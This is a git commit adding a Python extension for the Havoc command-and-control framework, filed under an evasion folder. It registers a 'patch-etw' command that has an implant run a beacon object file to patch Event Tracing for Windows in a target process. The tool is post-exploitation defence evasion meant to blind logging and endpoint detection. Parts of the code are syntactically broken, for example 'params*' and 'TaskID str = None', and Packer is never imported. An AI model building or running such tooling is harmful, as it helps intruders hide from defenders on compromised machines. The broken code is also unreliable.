bfcb2447c13f640077e479839fa47e5934764632
Chaotic <50114982+0xVaderSec@users.noreply.github.com>
2025-09-12 09:40:01 -0500

    Create EtwPatch.py

---
+++ scripts/evasion/havoc-PatchETW/dist/EtwPatch.py
@@ -0,0 +1,29 @@
+from havoc import Demon, RegisterCommand
+
+def PatchETW(demonID, params*):
+    TaskID str = None
+    demon: Demon = None
+    packer = Packer()
+    
+    num_params = len(params)
+    pid = 0
+
+    demon = Demon(demonID) 
+
+    if num_params != 1:
+        demon.ConsoleWrite(demon.CONSOLE_ERROR, "The argument must be a valid PID")
+        return True
+
+    pid = params [ 0 ]
+
+    packer.addstr(pid) 
+
+    if demon.ProcessArch == "x86":
+        TaskID = demon.ConsoleWrite(demon.CONSOLE_ERROR, "This bof only supports x64, please use that instead")
+    else:
+        bof_file = "EtwPatch.x64.o"
+    
+    demon.ConsoleWrite(demon.CONSOLE_TASK,"Tasked demon to patch ETW") 
+    demon.InlineExecute(TaskID,"go", bof_file, packer.getbuffer(), False)
+
+RegisterCommand(PatchETW, "patch-etw", "Patches Event Tracing for Windows with the given PID", 0, "<pid>", "1337")
